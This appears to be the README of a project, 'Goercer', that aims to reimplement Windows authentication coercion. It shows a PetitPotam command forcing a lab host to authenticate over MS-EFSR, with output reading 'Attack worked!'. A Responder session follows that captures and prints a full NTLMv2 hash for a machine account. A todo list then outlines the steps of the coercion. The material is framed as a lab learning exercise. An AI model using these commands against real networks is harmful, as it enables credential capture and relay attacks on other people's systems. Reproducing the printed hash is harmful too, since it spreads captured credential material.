# Goercer

Goal: Implement all relevant coercion techniques to understand how they work

We know for certain this method works, so lets start here:

```text
../PetitPotam/PetitPotam.py -u slacker -d spinninglikea.top -pipe efsr 10.1.1.99 10.1.1.14
/home/slacker/goercer/../PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Password:
Trying pipe efsr
[-] Connecting to ncacn_np:10.1.1.14[\PIPE\efsrpc]
[+] Connected!
[+] Binding to df1941c5-fe89-4e79-bf10-463657acf44d
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

```text
sudo ./Responder.py -I ens18 -v                                                 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Sponsor this project: [USDT: TNS8ZhdkeiMCT6BpXnj4qPfWo3HpoACJwv] , [BTC: 15X984Qco6bUxaxiR8AmTnQQ5v1LJ2zpNo]

[+] Poisoners:
    LLMNR                      [OFF]
    NBT-NS                     [OFF]
    MDNS                       [OFF]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [OFF]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [OFF]
    SQL server                 [OFF]
    FTP server                 [OFF]
    IMAP server                [OFF]
    POP3 server                [OFF]
    SMTP server                [OFF]
    DNS server                 [OFF]
    LDAP server                [OFF]
    MQTT server                [OFF]
    RDP server                 [OFF]
    DCE-RPC server             [OFF]
    WinRM server               [OFF]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [ens18]
    Responder IP               [10.1.1.99]
    Responder IPv6             [fe80::953e:180:c1f4:45a6]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-TCLLLONX0HR]
    Responder Domain Name      [B3OT.LOCAL]
    Responder DCE-RPC Port     [47876]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.1.1.14
[SMB] NTLMv2-SSP Username : splat\DESKTOP-NL7DJHI$
[SMB] NTLMv2-SSP Hash     : DESKTOP-NL7DJHI$::splat:ca50cd0df4344ca4:DB3BAB22322D1130BEF6C91819625219:010100000000000080341A80B86ADC018047997B3485F0A20000000002000800420033004F00540001001E00570049004E002D00540043004C004C004C004F004E00580030004800520004003400570049004E002D00540043004C004C004C004F004E0058003000480052002E00420033004F0054002E004C004F00430041004C0003001400420033004F0054002E004C004F00430041004C0005001400420033004F0054002E004C004F00430041004C000700080080341A80B86ADC0106000400020000000800300030000000000000000000000000400000644F3D1FCFAA6AF791E2EA5F6BCF14B7D0DA5321998A756C520189745AFFB9830A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0031002E0031002E003900390000000000000000
```

## Todo

- SMB2 connection
- NTLM authentication
- Tree connect to IPC$
- Create/open the efsrpc named pipe
- DCERPC bind to MS-EFSR
- Send EfsRpcOpenFileRaw request with UNC path to listener
